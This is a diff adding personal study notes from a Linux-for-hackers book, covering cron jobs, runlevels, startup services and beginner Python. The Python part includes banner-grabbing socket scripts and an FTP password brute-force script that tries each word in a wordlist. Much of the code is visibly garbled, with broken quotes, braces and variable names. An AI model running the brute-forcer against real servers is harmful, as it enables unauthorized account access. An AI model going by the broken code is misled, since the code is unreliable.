@@ -1170,6 +1170,106 @@ lsmod
 
 \\Chapter 16 AUTOMATING TASKS WITH JOB SCHEDULING
 
+cron daemon or crontab run automaitcally
+crond daemon runs in the back, checks cron table
+/etc/crontab
+seven fields in cron table
+e first five are used to schedule the time
+to run the task, the sixth field specifies the user, and the seventh field is used for the absolute path to the command you want to execute
+
+the minute, hour, day of the month, month, and day of the week
+
+FieldTime unit | Representation
+1 Minute            0–59
+2 Hour              0–23
+3 Day of the month  1–31
+4 Month             1–12
+5 Day of the week   0–7
+
+sample cron
+M H DOM MON DOW USER COMMAND
+30 2 * * 1­5 root /root/myscanningscript
+
+If you want to execute a script on multiple noncontiguous days of the week, you can separate those days with commas (,). Thus, Tuesday and Thursday would be 2,4.
+
+crontab -e
+asks you your favorite text editor, usually choose nano or vim
+or you can select it immediatley
+
+leafpad /etc/crontab
+
+backup on off hours weekend
+create a user for back up
+00 2 * * 0 backup /bin/systembackup.sh
+1. At the top of the hour (00),
+2. Of the second hour (2),
+3. Of any day of the month (*),
+4. Of any month (*),
+5. On Sunday (0),
+6. As the backup user,
+7. Execute the script at /bin/systembackup.sh
+The cron daemon will then execute that script every Sunday morning at 2 AM, every month
+
+00 2 15,30 * * backup /root/systembackup.sh
+
+00 23 * * 1­5 backup /root/systembackup.sh
+
+This job would run at 11 PM (hour 23), every day of the month, every month, but only
+on Monday through Friday (days 1–5). Especially note that we designated the days Monday through Friday by providing an interval of days (1-5) separated by a dash (-). This could have also been designated as 1,2,3,4,5; either way works perfectly fine.
+
+\\Using crontab to Schedule Your MySQLscann\\
+
+00 9 * * * user /usr/share/MySQLsscanner.sh
+
+00 2 * 6­8 0,6 user /usr/share/MySQLsscanner.sh
+
+added to cronfile
+
+# crontab shortcuts
+
+@yearly
+@annually
+@monthly
+@weekly
+@daily
+@midnight
+@noon
+@reboot
+
+@midnight user /usr/share/MySQLsscanner.sh
+
+Whenever you start your Linux system, a number of scripts are run to set up the environment for you. These are known as the rc scripts. After the kernel has initialized and loaded all its modules, the kernel starts a daemon known as init or init.d. This daemon then begins to run a number of scripts found in /etc/init.d/rc. These scripts include commands for starting many of the services necessary to run your Linux system as you expect
+
+Linux Runlevels
+
+Linux has multiple runlevels that indicate what services should be started at bootup. For instance, runlevel 1 is single­user mode, and services such as networking are not started in runlevel 1. The rc scripts are set to run depending on what runlevel is selected:
+
+0 Halt the system
+1 Single­user/minimal mode
+2–5 Multiuser modes
+6 Reboot the system
+
+Adding Services to rc.d
+You can add services for the rc.d script to run at startup using the update-rc.d command.
+
+update-rc.d <name of the script or service>
+<remove|defaults|disable|enable>
+
+ps aux | grep postgresql
+update-rc.d postgresql defaults
+
+\\ADDING SERVICES TO YOUR BOOTUP VIA A GUI\\
+
+apt-get install rcconf
+rcconf
+
+In this figure, you can see the PostgreSQL service listed second from last. Press the spacebar to select this service, press TAB to highlight <Ok>, and then press ENTER. The next time you boot Kali, PostgreSQL will start automatically.
+
+
+
+\\Chapter 17 PYTHON SCRIPTING BASICS FOR HACKERS
+Many of the most popular hacker tools are written in Python, including sqlmap, scapy, the Social­Engineer Toolkit (SET), w3af, and many more
+
 apt-get install python3-pi
 
 pip3 install <package name>
@@ -1185,3 +1285,184 @@ wget http://xael.org/norman/python/python-nmap/python-nmap-0.3.4.tar.gz
 tar -xzf python-nmap-0.3.4.tar.gz
 d python-nmap-.03.4/
 ~/python-nmap-0.3.4 >python setup.py install
+
+Kali has the IDE PyCrust
+JetBrain’s PyCharm
+
+#! /usr/bin/python3
+
+name="OccupyTheWeb"
+
+print ("Greetings to " + name + " from Hackers­Arise. The Best Place to Learn Hacking!")
+
+chmod 755 hackers-arise_greetings.py
+
+Your current directory is not in the $PATH variable for security reasons, so we need to precede the script name with ./ to tell the system to look in the current directory for the filename and execute it.
+
+./hackers-arise_greetings.py
+
+#! /usr/bin/python3
+HackersAriseStringVariable = "Hackers­Arise Is the Best Place to Learn Hacking"
+
+HackersAriseIntegerVariable = 12
+
+HackersAriseFloatingPointVariable = 3.1415
+
+HackersAriseList = [1,2,3,4,5,6]
+
+HackersAriseDictionary = {'name' : 'OccupyTheWeb', 'value' : 27)
+
+print (HackersAriseStringVariable)
+print (HackersAriseIntegerVariable)
+print (HackersAriseFloatingPointVariable)
+
+=====================
+
+fruit_color = {'apple' : 'red', 'grape' : 'green', orange : 'orange'}
+
+print (fruit_color['grape'])
+
+fruit_color['apple'] : 'green'
+
+chmod 755 secondpythonscript.py
+./secondpythonscript.py
+
+In Python, there is no need to declare a variable before assigning a value to it, as in some other programming languages.
+
+==========================
+Python uses the # symbol to designate the start of single­line comment. If you want to write multiline comments, you can use three double quotationmarks (""") at the start and end of the comment section.
+
+#! /usr/bin/python3
+
+"""
+This is my first Python script with comments. Comments are used to help explain code to ourselves and fellow programmers. In this case, this simple script creates a greeting forthe user.
+"""
+
+name = "OccupyTheWeb"
+
+print ("Greetings to "+name+" from Hackers­Arise. The Best Place to Learn Hacking!")
+
+./hackers-arise_greetings.py
+
+\\Funtions\\
+
+exit() exits from a program.
+
+float() returns its argument as a floating­point number. For example, float(1) would
+return 1.0.
+
+help() displays help on the object specified by its argument.
+
+int() returns the integer portion of its argument (truncates).
+
+len() returns the number of elements in a list or dictionary.
+
+max() returns the maximum value from its argument (a list).
+
+open() opens the file in the mode specified by its arguments.
+
+range() returns a list of integers between two values specified by its arguments.
+
+sorted() takes a list as an argument and returns it with its elements in order.
+
+type() returns the type of its argument (for example, int, file, method, function)
+
+import nmap
+
+HackersAriseSSHBannerGrab.py
+
+A banner is what an application presents when someone or something connects to it. It’s kind of like an application sending a greeting announcing what it is. Hackers use a technique known as banner grabbing to find out crucial information about what application or service is running on a port.
+
+
+#! /usr/bin/python3
+➊ import socket
+➋ s = socket.socket()
+➌ s.connect(("192.168.1.101", 22))
+➍ answer = s.recv(1024)
+➎ print (answer)
+s.close
+
+./HackersAriseSSHBannerGrab.py
+SSH­2.0­OpenSSH_7.3p1 Debian­1
+============================
+
+#! /usr/bin/python3
+import socket
+➊ TCP_IP = "192.168.181.190"
+TCP_PORT = 6996
+BUFFER_SIZE = 100
+➋ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+➌ s.bind((TCP_IP, TCP_PORT))
+➍ s.listen (1)
+➎ conn, addr = s.accept()
+print ('Connection address: ', addr )
+while 1:
+data=conn.recv(BUFFER_SIZE)
+ if not data:break
+print ("Received data: ", data)
+conn.send(data) #echo
+conn.close
+
+dict = {key1:value1, key2:value2, key3:value3...}
+
+if conditional expression
+run this code if the expression is true
+
+if conditional expression
+*** # run this code when the condition is met
+else
+*** # run this code when the condition is not met
+
+count = 1
+while (count <= 10):
+print (count)
+count += 1
+
+for password in passwords:
+attempt = connect (username, password)
+if attempt == "230"
+print ("Password found: " + password)
+sys.exit (0)
+
+
+#! /usr/bin/python3
+import socket
+➊ Ports = [21,22,25,3306]
+➋ for i in range (0,4):
+s = socket.socket()
+➌ Ports = Port[i]
+print ('This Is the Banner for the Port')
+print (Ports)
+➍ s.connect (("192.168.1.101", Port))
+ answer = s.recv (1024)
+print (answer)
+s.close ()
+
+#! /usr/bin/python3
+import ftplib
+➊ server = input(FTP Server: ")
+➋ user = input("username: ")
+➌ Passwordlist = input ("Path to Password List > ")
+➍ try:
+with open(Passwordlist, 'r') as pw:
+for word in pw:
+➎ word = word.strip ('\r').strip('\n')
+➏ try:
+ftp = ftplib.FTP(server)
+ftp.login(user, word)
+➐ print (Success! The password is ' + word)
+➑ except:
+print('still trying...')
+except:
+print ('Wordlist error'
+
+
+
+
+
+
+
+
+
+
+
